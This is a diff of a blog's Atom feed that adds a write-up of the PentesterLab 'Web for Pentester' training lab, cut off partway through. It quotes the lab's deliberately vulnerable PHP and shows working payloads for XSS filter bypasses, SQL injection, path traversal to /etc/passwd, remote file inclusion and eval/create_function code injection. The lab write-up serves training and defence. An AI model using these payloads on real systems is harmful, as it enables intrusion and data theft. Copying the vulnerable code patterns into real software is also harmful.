@@ -4,7 +4,7 @@
   <title><![CDATA[Category: writeups | Core dump overflow]]></title>
   <link href="http://chousensha.github.io/blog/categories/writeups/atom.xml" rel="self"/>
   <link href="http://chousensha.github.io/"/>
-  <updated>2017-05-04T06:30:55-04:00</updated>
+  <updated>2017-05-14T15:24:19-04:00</updated>
   <id>http://chousensha.github.io/</id>
   <author>
     <name><![CDATA[chousensha]]></name>
@@ -12,6 +12,1275 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[Pentest lab - Web for Pentester]]></title>
+    <link href="http://chousensha.github.io/blog/2017/05/04/pentest-lab-web-for-pentester/"/>
+    <updated>2017-05-04T06:38:11-04:00</updated>
+    <id>http://chousensha.github.io/blog/2017/05/04/pentest-lab-web-for-pentester</id>
+    <content type="html"><![CDATA[<p>Today I want to mix things up a bit, and do a challenge focused exclusively on web vulnerabilities. For the target, I will use the Web for Pentester ISO offered by <a href="https://www.pentesterlab.com/">PentesterLab</a>. They host many challenges dedicated to web hacking, and I recommend you give them a try!</p>
+
+<!-- more -->
+
+
+<p>Navigating to the VM, we are greeted by this page:</p>
+
+<p><img class="center" src="/images/pentest/webpentester/web.png" title="&lsquo;web for pentester&rsquo; &lsquo;web for pentester&rsquo;" ></p>
+
+<p>As you can see, we&rsquo;ve got plenty of exercises, so let&rsquo;s begin!</p>
+
+<h3>XSS</h3>
+
+<p><strong>Example 1</strong></p>
+
+<p><img class="center" src="/images/pentest/webpentester/xss1.png" title="&lsquo;xss&rsquo; &lsquo;web for pentester xss 1&rsquo;" ></p>
+
+<p>Source code:</p>
+
+<p>``` php
+&lt;?php require_once &lsquo;../header.php&rsquo;; ?>
+<html>
+Hello
+&lt;?php</p>
+
+<pre><code>echo $_GET["name"];
+</code></pre>
+
+<p>?></p>
+
+<p>&lt;?php require_once &lsquo;../footer.php&rsquo;; ?>
+```</p>
+
+<p>This is the most basic type of injection:</p>
+
+<p>``` html</p>
+
+<script>alert('there')</script>
+
+
+<p>```</p>
+
+<p>Now you will get an alert box and if you look in the source, you will see the exact same injection, with no filtering whatsoever.</p>
+
+<p><strong>Example 2</strong></p>
+
+<p>Source code:</p>
+
+<p>``` php
+&lt;?php require_once &lsquo;../header.php&rsquo;; ?>
+Hello
+&lt;?php</p>
+
+<p>$name =  $_GET[&ldquo;name&rdquo;];
+$name = preg_replace(&ldquo;/<script>/&rdquo;,&ldquo;&rdquo;, $name);
+$name = preg_replace(&ldquo;/&lt;\/script>/&rdquo;,&ldquo;&rdquo;, $name);
+echo $name;
+?>
+&lt;?php require_once &lsquo;../footer.php&rsquo;; ?>
+```</p>
+
+<p>This one looks like the previous one, but in the source, we can see that the script tags are replaced with empty strings, but only for lowercase. I changed the case of the script tags to SCRIPT, and the alert box was back!</p>
+
+<p><strong>Example 3</strong></p>
+
+<p>The source looks like this:</p>
+
+<p>``` php
+&lt;?php require_once &lsquo;../header.php&rsquo;; ?>
+Hello
+&lt;?php</p>
+
+<pre><code>$name =  $_GET["name"];
+$name = preg_replace("/&lt;script&gt;/i","", $name);
+$name = preg_replace("/&lt;\/script&gt;/i","", $name);
+</code></pre>
+
+<p>echo $name;
+?></p>
+
+<p>&lt;?php require_once &lsquo;../footer.php&rsquo;; ?>
+```</p>
+
+<p>This time the script tags are filtered regardless of the case. To see what&rsquo;s going on, I inserted script tags inside a placeholder value:</p>
+
+<p><code>plain
+place&lt;script&gt;holder
+</code></p>
+
+<p>As expected, they disappear into the abyss, and the message echoed in the page is Hello placeholder . I then tried doubling the script tags:</p>
+
+<p><code>plain
+place&lt;&lt;script&gt;&gt;holder
+</code></p>
+
+<p>The message changed to <code>Hello place&lt;>holder</code> . This is great, it means we can have nested tags that will be interpreted! I built the payload to:</p>
+
+<p><code>plain
+ &lt;scr&lt;script&gt;ipt&gt;alert(1)&lt;/scr&lt;/script&gt;ipt&gt;
+</code></p>
+
+<p><strong>Example 4</strong></p>
+
+<p>Source:</p>
+
+<p>``` php
+&lt;?php require_once &lsquo;../header.php&rsquo;;</p>
+
+<p>if (preg_match(&lsquo;/script/i&rsquo;, $_GET[&ldquo;name&rdquo;])) {
+  die(&ldquo;error&rdquo;);
+}
+?></p>
+
+<p>Hello &lt;?php  echo $_GET[&ldquo;name&rdquo;]; ?>
+&lt;?php require_once &lsquo;../footer.php&rsquo;; ?>
+```</p>
+
+<p>This time, the script throws an error if it sees anything resembling script tags. Luckily, we can get an XSS payload to execute in different ways. For this I used:</p>
+
+<p><code>plain
+&lt;img src='nope' onerror="alert('Got ya')" /&gt;
+</code></p>
+
+<p><strong>Example 5</strong></p>
+
+<p>Source code:</p>
+
+<p>``` php
+&lt;?php require_once &lsquo;../header.php&rsquo;;</p>
+
+<p>if (preg_match(&lsquo;/alert/i&rsquo;, $_GET[&ldquo;name&rdquo;])) {
+  die(&ldquo;error&rdquo;);
+}
+?></p>
+
+<p>Hello &lt;?php  echo $_GET[&ldquo;name&rdquo;]; ?>
+&lt;?php require_once &lsquo;../footer.php&rsquo;; ?>
+```</p>
+
+<p>All right, it looks like script tags aren&rsquo;t blacklisted anymore, but this time the alert word is. I just substituted the alert for prompt:</p>
+
+<p>``` plain</p>
+
+<script>prompt('Enter pwn code')</script>
+
+
+<p>```</p>
+
+<p><strong>Example 6</strong></p>
+
+<p>PHP source:</p>
+
+<p>``` php
+&lt;?php require_once &lsquo;../header.php&rsquo;; ?>
+Hello</p>
+
+<script>
+    var $a= "<?php  echo $_GET["name"]; ?>";
+</script>
+
+
+<pre><code>&lt;?php require_once '../footer.php'; ?&gt;
+</code></pre>
+
+<p>```</p>
+
+<p>This time, whatever we place inside the name variable is assigned to a variable. The page source looks like this:</p>
+
+<p>``` html
+Hello</p>
+
+<script>
+    var $a= "hacker";
+</script>
+
+
+<p>```</p>
+
+<p>We want to build on the existing code and add our own. This means we will have to close the quotes and add our payload. First, I inserted something to see the changes:</p>
+
+<p><code>plain
+hacker";INJECTION
+</code></p>
+
+<p>And in the HTML code I saw this:</p>
+
+<p><code>plain
+var $a= "hacker";INJECTION";
+</code></p>
+
+<p>The part up to the first semicolon is what we want, then we have to place our payload, but a stray doublequote and semicolon remain. To get rid of them, I commented them out, and the final injection looked like this:</p>
+
+<p><code>plain
+hacker";alert("not enough");//
+</code></p>
+
+<p>And in the source it is rendered the following way:</p>
+
+<p><code>plain
+var $a= "hacker";alert("not enough");//";
+</code></p>
+
+<p><strong>Example 7</strong></p>
+
+<p>PHP code:</p>
+
+<p>``` php
+&lt;?php require_once &lsquo;../header.php&rsquo;; ?>
+Hello</p>
+
+<script>
+    var $a= '<?php  echo htmlentities($_GET["name"]); ?>';
+</script>
+
+
+<p>&lt;?php require_once &lsquo;../footer.php&rsquo;; ?>
+```</p>
+
+<p>It appears that now there is encoding performed on the name variable to prevent the previous type of bypass. Let&rsquo;s see how the source looks with the previous payload:</p>
+
+<p><code>plain
+var $a= 'hacker&amp;quot;;alert(&amp;quot;not enough&amp;quot;);//';
+</code></p>
+
+<p>The attack was nullified, but if you look at the <code>htmlentities</code> PHP manual page, you will see that, if not otherwise specified, the default flag is ENT_COMPAT, which converts double-quotes and leaves single-quotes alone. So all I had to do was replace the double-quotes with single-quotes:</p>
+
+<p><code>plain
+hacker';alert('still not enough');//
+</code></p>
+
+<p>And this is translated in the HTML as:</p>
+
+<p><code>plain
+var $a= 'hacker';alert('stillnot enough');//';
+</code></p>
+
+<p><strong>Example8</strong></p>
+
+<p><img class="center" src="/images/pentest/webpentester/xss8.png" title="&lsquo;xss 8&rsquo; &lsquo;web for pentester xss 8&rsquo;" ></p>
+
+<p>This looks a little different, we input something and it gets echoed back in a greeting: HELLO something</p>
+
+<p>Source code:</p>
+
+<p>``` php
+&lt;?php
+  require_once &lsquo;../header.php&rsquo;;</p>
+
+<p>  if (isset($_POST[&ldquo;name&rdquo;])) {</p>
+
+<pre><code>echo "HELLO ".htmlentities($_POST["name"]);
+</code></pre>
+
+<p>  }
+?>
+<form action="<?php echo $_SERVER['PHP_SELF']; ?>&ldquo; method="POST&rdquo;>
+  Your name:<input type="text" name="name" />
+  <input type="submit" name="submit"/></p>
+
+<p>&lt;?php</p>
+
+<p>  require_once &lsquo;../footer.php&rsquo;;</p>
+
+<p>?>
+```</p>
+
+<p>PHP_SELF returns the currently executing script and its path from the root folder. In our case, where the URL is <a href="http://192.168.217.138/xss/example8.php">http://192.168.217.138/xss/example8.php</a> , PHP_SELF would be /xss/example8.php .</p>
+
+<p><a href="http://form.guide/php-form/php-form-action-self.html">The PHP_SELF variable</a> is vulnerable to XSS if not enclosed within htmlentities(). Which means we can put our payload in the URL: <a href="http://192.168.217.138/xss/example8.php/INJECTION">http://192.168.217.138/xss/example8.php/INJECTION</a></p>
+
+<p>Now, we need to take note of how to build the payload:</p>
+
+<p><code>html
+HELLO hacker&lt;form action="/xss/example8.php/hacker" method="POST"&gt;
+</code></p>
+
+<p>My successful injection was:</p>
+
+<p><code>plain
+hacker"&gt;&lt;script&gt;alert(9000)&lt;/script&gt;"
+</code></p>
+
+<p>And the source now looks like this:</p>
+
+<p><code>html
+&lt;form action="/xss/example8.php/hacker"&gt;&lt;script&gt;alert(9000)&lt;/script&gt;"" method="POST"&gt;
+</code></p>
+
+<p>The first double-quote and <code>></code> closed the form action part, then came the injection, and then I put another double-quote to keep company to the stray one that remained.</p>
+
+<p><strong>Example9</strong></p>
+
+<p><img class="center" src="/images/pentest/webpentester/xss9.png" title="&lsquo;xss 9&rsquo; &lsquo;dom xss&rsquo;" ></p>
+
+<p>Whatever we put after the pound sign gets rendered on the page. Here&rsquo;s the code that does it:</p>
+
+<p>``` html</p>
+
+<script>
+  document.write(location.hash.substring(1));
+</script>
+
+
+<p>```</p>
+
+<p>First, we have to understand the <a href="https://www.w3schools.com/jsref/jsref_substring.asp">substring</a> method:</p>
+
+<blockquote><p> string.substring(start, end)</p>
+
+<p>This method extracts the characters in a string between &ldquo;start&rdquo; and &ldquo;end&rdquo;, not including &ldquo;end&rdquo; itself.
+Characters start at index 0</p></blockquote>
+
+<p>And the <a href="https://www.w3schools.com/jsref/prop_loc_hash.asp">location.hash</a> returns the anchor part of the URL. So if our URL is <a href="http://192.168.217.138/xss/example9.php#moo">http://192.168.217.138/xss/example9.php#moo</a> , it will return #moo . And combined with the substring function, whatever comes after the hash is written to the page, as we saw at the beginning.</p>
+
+<p>This page is vulnerable to DOM-based XSS, where a modification the DOM environment affects how the client code is running. Just put the payload after the hash sign, and reload the page (I had to use Chrome to see the alert):</p>
+
+<p><code>plain
+http://192.168.217.138/xss/example9.php#&lt;script&gt;alert('Bye')&lt;/script&gt;
+</code></p>
+
+<h3>SQL injections</h3>
+
+<p><strong>Example1</strong></p>
+
+<p><img class="center" src="/images/pentest/webpentester/sql1.png" title="&lsquo;sqli&rsquo; &lsquo;sql injection&rsquo;" ></p>
+
+<p>Ok, before tampering with anything, let&rsquo;s look at the source:</p>
+
+<p>``` php
+&lt;?php</p>
+
+<p>  require_once(&lsquo;../header.php&rsquo;);
+  require_once(&lsquo;db.php&rsquo;);</p>
+
+<pre><code>$sql = "SELECT * FROM users where name='";
+$sql .= $_GET["name"]."'";  
+$result = mysql_query($sql);
+if ($result) {
+    ?&gt;
+    &lt;table class='table table-striped'&gt;
+  &lt;tr&gt;&lt;th&gt;id&lt;/th&gt;&lt;th&gt;name&lt;/th&gt;&lt;th&gt;age&lt;/th&gt;&lt;/tr&gt;
+    &lt;?php
+    while ($row = mysql_fetch_assoc($result)) {
+        echo "&lt;tr&gt;";
+            echo "&lt;td&gt;".$row['id']."&lt;/td&gt;";
+            echo "&lt;td&gt;".$row['name']."&lt;/td&gt;";
+            echo "&lt;td&gt;".$row['age']."&lt;/td&gt;";
+        echo "&lt;/tr&gt;";
+    }   
+    echo "&lt;/table&gt;";
+}
+</code></pre>
+
+<p>  require_once &lsquo;../footer.php&rsquo;;
+?>
+```</p>
+
+<p>So, the code looks in the users table for whatever we give it, and if a match is found, it displays some info. You can see there is no filtering on our input, and the DB query is <code>SELECT * FROM users where name=&lsquo;input&rsquo;</code>. This is trivial to bypass, by using <code>root' or 1=1&mdash; </code> (there is a space after &mdash;), and don&rsquo;t forget to URL encode for it to work! The query now becomes <code>SELECT * FROM users where name=&lsquo;root&rsquo; or 1=1&mdash; &lsquo;</code>, and the stray quote is commented out.</p>
+
+<p><img class="center" src="/images/pentest/webpentester/sqlinj1.png" title="&lsquo;sqli&rsquo; &lsquo;sqli results&rsquo;" ></p>
+
+<p><strong>Example2</strong></p>
+
+<p>This example looks the same like the previous one, but the difference is in the code:</p>
+
+<p>``` php
+if (preg_match(&lsquo;/ /&rsquo;, $_GET[&ldquo;name&rdquo;])) {</p>
+
+<pre><code>    die("ERROR NO SPACE");  
+}
+$sql = "SELECT * FROM users where name='";
+$sql .= $_GET["name"]."'";
+
+$result = mysql_query($sql);
+</code></pre>
+
+<p>```</p>
+
+<p>Basically, the space characters are being filtered out. However, we can achieve the same results by using tabs (<code>\t</code>), which would change the previous injection to: <code>SELECT * FROM users where name=&lsquo;root&rsquo; or  1=1#</code>, where the same outcome is achieved by substituting the spaces for tabs and the comment characters from <code>&mdash; </code> to <code>#</code>. Again, don&rsquo;t forget URL encoding though!</p>
+
+<p><strong>Example3</strong></p>
+
+<p>Same-looking page, but slightly different code:</p>
+
+<p>``` php
+if (preg_match(&lsquo;/\s+/&rsquo;, $_GET[&ldquo;name&rdquo;])) {</p>
+
+<pre><code>    die("ERROR NO SPACE");  
+}
+$sql = "SELECT * FROM users where name='";
+$sql .= $_GET["name"]."'";
+
+$result = mysql_query($sql);
+</code></pre>
+
+<p>```</p>
+
+<p>This time, a regular expression prevents the use of any whitespace characters, including tabs, carriage returns, etc. It is possible to bypass this by using <a href="http://www.sqlinjection.net/comments/">C-style comments</a>: <code>/**/</code>. Here, our injection would be:</p>
+
+<p><code>plain
+'/**/or/**/1=1#
+</code></p>
+
+<p>And the DB query would look like this:</p>
+
+<p><code>sql
+SELECT * FROM users where name='root'/**/or/**/1=1#'
+</code></p>
+
+<p>As always, don&rsquo;t forget to URL encode when injecting!</p>
+
+<p><strong>Example4</strong></p>
+
+<p>Here, the URL looks just a tiny bit different: <a href="http://192.168.217.138/sqli/example4.php?id=2">http://192.168.217.138/sqli/example4.php?id=2</a></p>
+
+<p>And the code:</p>
+
+<p>``` php
+$sql=&ldquo;SELECT * FROM users where id=&rdquo;;</p>
+
+<pre><code>$sql.=mysql_real_escape_string($_GET["id"])." ";
+$result = mysql_query($sql);
+</code></pre>
+
+<p>```</p>
+
+<p>So, the query performed is <code>SELECT * FROM users where id=INPUT </code>, but this time, the <code>mysql_real_escape_string</code> function is used to escape the characters: <code>\x00, \n, \r, \, &lsquo;, &ldquo; and \x1a</code>. All that protection is for naught however, because the id parameter is an integer, where there is no need to use quotes. So I injected <code>2 or 1=1&mdash; </code> and again saw all results.</p>
+
+<p><strong>Example5</strong></p>
+
+<p>We have the same example as the previous one, but with some modifications to the underlying code:</p>
+
+<p>``` php
+if (!preg_match(&lsquo;/^[0-9]+/&rsquo;, $_GET[&ldquo;id&rdquo;])) {</p>
+
+<pre><code>    die("ERROR INTEGER REQUIRED");  
+}
+$sql = "SELECT * FROM users where id=";
+$sql .= $_GET["id"] ;
+
+$result = mysql_query($sql);
+</code></pre>
+
+<p>```</p>
+
+<p>The regular expression will make the script throw an error and stop executing if it encounters non-integer characters in the input. But the check is only made at the beginning of the input, as can be seen from the fact that there is a <code>^</code>, but not a <code>$</code> delimiter for the end. Again, the injection is trivial: <code>id=2 or 1=1&mdash; </code>.</p>
+
+<p><strong>Example6</strong></p>
+
+<p>The developer tried to fix the previous mistake with:</p>
+
+<p>``` php
+if (!preg_match(&lsquo;/[0-9]+$/&rsquo;, $_GET[&ldquo;id&rdquo;])) {</p>
+
+<pre><code>    die("ERROR INTEGER REQUIRED");  
+}
+$sql = "SELECT * FROM users where id=";
+$sql .= $_GET["id"] ;
+
+
+$result = mysql_query($sql);
+</code></pre>
+
+<p>```</p>
+
+<p>Now the code checks for the end of the string to be an integer, but not for the beginning xD Well, we can inject without worrying that we have to comment something afterwards: <code>id=2 or 1=1</code></p>
+
+<p><strong>Example7</strong></p>
+
+<p>Finally, the code checks for integers both at the beginning and the end:</p>
+
+<p>``` php
+if (!preg_match(&lsquo;/^&ndash;?[0-9]+$/m&rsquo;, $_GET[&ldquo;id&rdquo;])) {</p>
+
+<pre><code>    die("ERROR INTEGER REQUIRED");  
+}
+$sql = "SELECT * FROM users where id=";
+$sql .= $_GET["id"];
+
+$result = mysql_query($sql);
+</code></pre>
+
+<p>```</p>
+
+<p>There is something new in this regex: a PCRE_MULTILINE pattern modifier. Let&rsquo;s see what this does:</p>
+
+<blockquote><p> m (PCRE_MULTILINE)</p>
+
+<p>   By default, PCRE treats the subject string as consisting of a single &ldquo;line&rdquo; of characters
+(even if it actually contains several newlines). The &ldquo;start of line&rdquo; metacharacter (^) matches
+only at the start of the string, while the &ldquo;end of line&rdquo; metacharacter ($) matches only at the
+end of the string, or before a terminating newline (unless D modifier is set). This is the same
+as Perl. When this modifier is set, the &ldquo;start of line&rdquo; and &ldquo;end of line&rdquo; constructs match
+immediately following or immediately before any newline in the subject string, respectively, as
+well as at the very start and end. This is equivalent to Perl&rsquo;s /m modifier. If there are no
+&ldquo;\n&rdquo; characters in a subject string, or no occurrences of ^ or $ in a pattern, setting this
+modifier has no effect.</p></blockquote>
+
+<p>So, the regex checks will be performed correctly on the first line, but we can insert new lines and inject our payload there, and no checks will be performed! With the payload <code>id=2%0A or 1=1</code>, a new line has been injected, and then the rest of the payload.</p>
+
+<p><strong>Example8</strong></p>
+
+<p><img class="center" src="/images/pentest/webpentester/sql8.png" title="&lsquo;sqli&rsquo; &lsquo;sqli 8&rsquo;" ></p>
+
+<p>This example introduces the ORDER BY statement:</p>
+
+<p><code>php
+$sql = "SELECT * FROM users ORDER BY `";
+$sql .= mysql_real_escape_string($_GET["order"])."`";
+$result = mysql_query($sql);
+</code></p>
+
+<p>The SQL query looks like this:</p>
+
+<p><code>sql
+SELECT * FROM users ORDER BY `INPUT`;
+</code></p>
+
+<p>For this exploitation, I used <a href="http://www.securityidiots.com/Web-Pentest/SQL-Injection/group-by-and-order-by-sql-injection.html#blind">this very helpful article about time-based injection in the ORDER BY clause</a>:</p>
+
+<p><code>plain
+order=name`,(select sleep(3) from dual where database() like database())#
+</code></p>
+
+<p>First, the successful injection will be reflected by the time it takes to load the page, specified inside the <a href="https://dev.mysql.com/doc/refman/5.7/en/miscellaneous-functions.html#function_sleep">SLEEP</a> function. The <a href="http://www.w3resource.com/sql/sql-dual-table.php">DUAL table</a> is a special table that can be used in queries that don&rsquo;t need data from any tables. <a href="http://www.bitbybit.dk/carsten/blog/?p=201">DATABASE()</a> returns the value of the currently selected  DB, and the <a href="https://www.tutorialspoint.com/sql/sql-like-clause.htm">LIKE</a> operator is used to compare a value with another similar one. For the injection to work, don&rsquo;t forget to URL encode! Now, let&rsquo;s see how the full query would look like:</p>
+
+<p><code>sql
+SELECT * FROM users ORDER BY `name`,(select sleep(3) from dual where database() like database())#`;
+</code></p>
+
+<p>That LIKE statement is useful, because it induces a condition that is matched by the SELECT statement.</p>
+
+<p><strong>Example9</strong></p>
+
+<p>Source code:</p>
+
+<p><code>php
+$sql = "SELECT * FROM users ORDER BY ";
+$sql .= mysql_real_escape_string($_GET["order"]);
+$result = mysql_query($sql);
+</code></p>
+
+<p>No more backticks here. I used the same payload as in the previous example, but without the backticks (and URL encoded):</p>
+
+<p><code>plain
+order=(select sleep(3) from dual where database() like database())#
+</code></p>
+
+<h3>Directory traversal</h3>
+
+<p><strong>Example1</strong></p>
+
+<p>If you inspect the image link, you will see: <code>dirtrav/example1.php?file=hacker.png</code>. The source code for this challenge is:</p>
+
+<p>``` php
+&lt;?php</p>
+
+<p>$UploadDir = &lsquo;/var/www/files/&rsquo;;</p>
+
+<p>if (!(isset($_GET[&lsquo;file&rsquo;])))</p>
+
+<pre><code>die();
+</code></pre>
+
+<p>$file = $_GET[&lsquo;file&rsquo;];</p>
+
+<p>$path = $UploadDir . $file;</p>
+
+<p>if (!is_file($path))</p>
+
+<pre><code>die();
+</code></pre>
+
+<p>header(&lsquo;Cache-Control: must-revalidate, post-check=0, pre-check=0&rsquo;);
+header(&lsquo;Cache-Control: public&rsquo;);
+header(&lsquo;Content-Disposition: inline; filename=&ldquo;&rsquo; . basename($path) . &lsquo;&rdquo;;&rsquo;);
+header(&lsquo;Content-Transfer-Encoding: binary&rsquo;);
+header(&lsquo;Content-Length: &rsquo; . filesize($path));</p>
+
+<p>$handle = fopen($path, &lsquo;rb&rsquo;);</p>
+
+<p>do {
+$data = fread($handle, 8192);
+if (strlen($data) == 0) {
+break;
+}
+echo($data);
+} while (true);</p>
+
+<p>fclose($handle);
+exit();</p>
+
+<p>?>
+```</p>
+
+<p>There is no filtering involved, so I displayed the <em>/etc/passwd</em> file with: <a href="http://192.168.217.138/dirtrav/example1.php?file=../../../../../etc/passwd">http://192.168.217.138/dirtrav/example1.php?file=../../../../../etc/passwd</a></p>
+
+<p><img class="center" src="/images/pentest/webpentester/passwd.png" title="&lsquo;passwd file&rsquo; &lsquo;passd file&rsquo;" ></p>
+
+<p><strong>Example2</strong></p>
+
+<p>The path for this one is <code>dirtrav/example2.php?file=/var/www/files/hacker.png</code>. In the code, we are only interested in the parts that manipulate the file to be included:</p>
+
+<p>``` php
+$file = $_GET[&lsquo;file&rsquo;];</p>
+
+<p>if (!(strstr($file,&ldquo;/var/www/files/&rdquo;)))</p>
+
+<pre><code>die();
+</code></pre>
+
+<p>```</p>
+
+<p>The script tries to enforce the location of the file to be in /var/www/files, but we can leave it as it is and just go up a few directories and include the passwd file again: <code>file=/var/www/files/../../../etc/passwd</code>.</p>
+
+<p><strong>Example 3</strong></p>
+
+<p>Here is the path: <code>dirtrav/example3.php?file=hacker</code></p>
+
+<p>And the code:</p>
+
+<p>``` php
+$UploadDir = &lsquo;/var/www/files/&rsquo;;</p>
+
+<p>if (!(isset($_GET[&lsquo;file&rsquo;])))</p>
+
+<pre><code>die();
+</code></pre>
+
+<p>$file = $_GET[&lsquo;file&rsquo;];</p>
+
+<p>$path = $UploadDir . $file.&ldquo;.png&rdquo;;
+// Simulate null-byte issue that used to be in filesystem related functions in PHP
+$path = preg_replace(&lsquo;/\x00.*/&rsquo;,&ldquo;&rdquo;,$path);</p>
+
+<p>if (!is_file($path))</p>
+
+<pre><code>die();
+</code></pre>
+
+<p>```</p>
+
+<p>The code gives the hint of exploiting this: the null byte, which will make the system ignore anything that comes after it. So the extension check will be bypassed: <code>file=../../../../../etc/passwd%00</code></p>
+
+<h3>File Include</h3>
+
+<p><strong>Example 1</strong></p>
+
+<p><img class="center" src="/images/pentest/webpentester/fileinc.png" title="&lsquo;file includes&rsquo; &lsquo;file inclusion&rsquo;" ></p>
+
+<p>Let&rsquo;s see the code:</p>
+
+<p>``` php
+&lt;?php</p>
+
+<pre><code>if ($_GET["page"]) {
+    include($_GET["page"]);
+
+} 
+</code></pre>
+
+<p>?>
+```</p>
+
+<p>There is no validation performed on the file to be included. For this challenge, PentesterLab provides a sample include file that calls phpinfo() at <a href="http://assets.pentesterlab.com/test_include.txt">http://assets.pentesterlab.com/test_include.txt</a></p>
+
+<p>Just include the above file to see the output of phpinfo(): <code>page=<a href="http://assets.pentesterlab.com/test_include.txt">http://assets.pentesterlab.com/test_include.txt</a></code></p>
+
+<p><img class="center" src="/images/pentest/webpentester/phpinfo.png" title="&lsquo;phpinfo&rsquo; &lsquo;phpinfo output&rsquo;" ></p>
+
+<p><strong>Example2</strong></p>
+
+<p>The URL is slightly different now: <a href="http://192.168.217.138/fileincl/example2.php?page=intro">http://192.168.217.138/fileincl/example2.php?page=intro</a></p>
+
+<p>And the code:</p>
+
+<p>``` php
+&lt;?php</p>
+
+<pre><code>if ($_GET["page"]) {
+$file = $_GET["page"].".php";
+// simulate null byte issue
+$file = preg_replace('/\x00.*/',"",$file);
+    include($file);
+} 
+</code></pre>
+
+<p>?>
+```</p>
+
+<p>So the code automatically appends a PHP extension to the file, but is also vulnerable to null bytes. I included the same file as in the previous example, with a <code>%00</code> at the end: <code>page=<a href="http://assets.pentesterlab.com/test_include.txt%00">http://assets.pentesterlab.com/test_include.txt%00</a></code></p>
+
+<h3>Code injection</h3>
+
+<p><strong>Example 1</strong></p>
+
+<p><img class="center" src="/images/pentest/webpentester/code1.png" title="&lsquo;code injection&rsquo; &lsquo;code injection 1&rsquo;" ></p>
+
+<p>Source code:</p>
+
+<p>``` php
+&lt;?php
+  $str=&ldquo;echo \"Hello &rdquo;.$_GET[&lsquo;name&rsquo;].&ldquo;!!!\&rdquo;;&ldquo;;</p>
+
+<p>  eval($str);
+?>
+```</p>
+
+<p>The string <code>echo &ldquo;Hello hacker!!!&rdquo;;</code> is passed to eval. Whatever else we input after the name variable comes right after hacker and before the exclamation signs: Hello hacker@!!! (with an example of adding @ after hacker). However, if we input a double-quote, we get an error:</p>
+
+<p><code>plain
+Parse error: syntax error, unexpected '!', expecting ',' or ';' in /var/www/codeexec/example1.php(6) : eval()'d code on line 1
+</code></p>
+
+<p>That is because eval now has to evaluate the broken syntax of <code>echo &ldquo;Hello hacker&rdquo;!!!&ldquo;;</code>. We can take advantage of this by appending a command and then commenting out the remaining <code>!!!&rdquo;;</code>:</p>
+
+<p><code>plain
+name=hacker" . system('hostname');//
+</code></p>
+
+<p>URL encode it and you will see the output:</p>
+
+<p><img class="center" src="/images/pentest/webpentester/codeinj1.png" title="&lsquo;code injection&rsquo; &lsquo;code injection 1 success&rsquo;" ></p>
+
+<p>This worked because what eval saw was: <code>echo &ldquo;Hello hacker&rdquo; . system(&lsquo;hostname&rsquo;);//!!!&ldquo;;</code></p>
+
+<p><strong>Example 2</strong></p>
+
+<p><img class="center" src="/images/pentest/webpentester/code2.png" title="&lsquo;code injection&rsquo; &lsquo;code injection 2&rsquo;" ></p>
+
+<p>PHP code:</p>
+
+<p>``` php
+&lt;?php
+class User{
+  public $id, $name, $age;
+  function __construct($id, $name, $age){</p>
+
+<pre><code>$this-&gt;name= $name;
+$this-&gt;age = $age;
+$this-&gt;id = $id;
+</code></pre>
+
+<p>  } <br/>
+}
+  require_once(&lsquo;../header.php&rsquo;);
+  require_once(&lsquo;../sqli/db.php&rsquo;);</p>
+
+<pre><code>$sql = "SELECT * FROM users ";
+
+$order = $_GET["order"];
+$result = mysql_query($sql);
+</code></pre>
+
+<p>  if ($result) {</p>
+
+<pre><code>    while ($row = mysql_fetch_assoc($result)) {
+  $users[] = new User($row['id'],$row['name'],$row['age']);
+}
+if (isset($order)) { 
+  usort($users, create_function('$a, $b', 'return strcmp($a-&gt;'.$order.',$b-&gt;'.$order.');'));
+}
+}   
+
+    ?&gt;
+</code></pre>
+
+<table class='table table-striped' >
+        <tr>
+            <th><a href="example2.php?order=id">id</th>
+            <th><a href="example2.php?order=name">name</th>
+            <th><a href="example2.php?order=age">age</th>
+        </tr>
+        <?php
+
+    foreach ($users as $user) {  
+            echo "<tr>";
+                echo "<td>".$user->id."</td>";
+                echo "<td>".$user->name."</td>";
+                echo "<td>".$user->age."</td>";
+            echo "</tr>";
+        }   
+        echo "</table>
+
+
+<p>  require &lsquo;../footer.php&rsquo;;
+?>
+```</p>
+
+<p>The line to focus on is:</p>
+
+<p><code>php
+usort($users, create_function('$a, $b', 'return strcmp($a-&gt;'.$order.',$b-&gt;'.$order.');'));
+</code></p>
+
+<p>Here, the <a href="https://www.pentesterlab.com/exercises/web_for_pentester/course">PentesterLab course</a> explains the vulnerability exists in the <a href="https://secure.php.net/manual/en/function.usort.php">usort(array, user-defined function)</a> function, because it uses <a href="https://secure.php.net/manual/en/function.create-function.php">create_function(args, code)</a>, which is used to create an anonymous (lambda-style) function. <strong>create_function</strong> is vulnerable to unfiltered input because it uses eval() at its core. There is a known <a href="http://www.exploitalert.com/view-details.html?id=10264">exploit</a> that allows code injection and executing the code without creating and calling the function. Let&rsquo;s see how this works:</p>
+
+<p><strong>create_function</strong> is a ZEND_FUNCTION defined in <em>zend_builtin_functions.c</em>. Here is part of the vulnerable code:</p>
+
+<p><img class="center" src="/images/pentest/webpentester/ffs.png" title="&lsquo;c code&rsquo; &lsquo;vulnerable code&rsquo;" ></p>
+
+<p>The folks at PentesterLab were nice enough to help me understand this, I was in one of those states where you don&rsquo;t see the forest from the trees! Basically, the code for the lambda function is the string inside curly brackets, and there is no filtering for {}. So later, this same user-supplied string gets evaluated by zend_eval_string. We can inject code in the $order parameter, so our code gets in this line:</p>
+
+<p><code>php
+usort($users, create_function('$a, $b', 'return strcmp($a-&gt;'.$order.',$b-&gt;'.$order.');'));
+</code></p>
+
+<p>And that line will be used in the format string. The payload I used is : <code>order=id);}echo &lsquo;INJECTION SUCCESSFUL&rsquo;;//</code>. Now, inside eval(), the lambda function without injection looks something like this:</p>
+
+<p><code>plain
+function LAMBDA_TEMP_FUNCNAME (a,b){return strcmp($a-&gt;'.$order.',$b-&gt;'.$order.');}
+</code></p>
+
+<p>Let&rsquo;s deconstruct it step by step. Adding <strong>);</strong> closes the call to strcmp, but leaves garbage behind and also an unclosed {} , because the end curly bracket is now part of the discarded code:</p>
+
+<p><code>plain
+function LAMBDA_TEMP_FUNCNAME (a,b){return strcmp($a-&gt;'.$order.');,$b-&gt;'.$order.');}
+</code></p>
+
+<p>Adding a closing curly bracket correctly closes the format string, so now we have:</p>
+
+<p><code>plain
+function LAMBDA_TEMP_FUNCNAME (a,b){return strcmp($a-&gt;'.$order.');},$b-&gt;'.$order.');}
+</code></p>
+
+<p>To test where I was with the injection, I left it at that and got this error:</p>
